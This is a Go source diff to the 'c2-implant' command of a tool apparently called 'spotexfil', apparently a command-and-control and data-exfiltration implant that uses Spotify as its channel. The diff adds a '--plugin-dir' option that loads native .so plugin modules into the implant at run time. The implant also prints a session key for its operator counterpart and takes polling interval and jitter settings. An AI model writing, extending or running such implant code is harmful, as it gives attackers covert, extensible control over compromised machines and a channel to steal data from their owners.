@@ -178,6 +178,7 @@ func cleanCmd() *cobra.Command {
 
 func c2ImplantCmd() *cobra.Command {
 	var interval, jitter int
+	var pluginDir string
 
 	cmd := &cobra.Command{
 		Use:   "c2-implant",
@@ -190,6 +191,13 @@ func c2ImplantCmd() *cobra.Command {
 			}
 			fmt.Printf("[*] Session key: %s\n", key)
 			fmt.Printf("[*] Use this key to start the operator: ./spotexfil c2-operator -k \"%s\"\n", key)
+
+			// Load plugins if directory specified
+			if pluginDir != "" {
+				if err := c2.LoadPlugins(pluginDir); err != nil {
+					fmt.Printf("[!] Plugin loading error: %v\n", err)
+				}
+			}
 
 			cfg, err := spotify.LoadConfig()
 			if err != nil {
@@ -209,6 +217,7 @@ func c2ImplantCmd() *cobra.Command {
 
 	cmd.Flags().IntVar(&interval, "interval", shared.Proto.C2.DefaultInterval, "Polling interval (seconds)")
 	cmd.Flags().IntVar(&jitter, "jitter", shared.Proto.C2.DefaultJitter, "Jitter range (seconds)")
+	cmd.Flags().StringVar(&pluginDir, "plugin-dir", "", "Directory containing .so plugin modules")
 
 	return cmd
 }
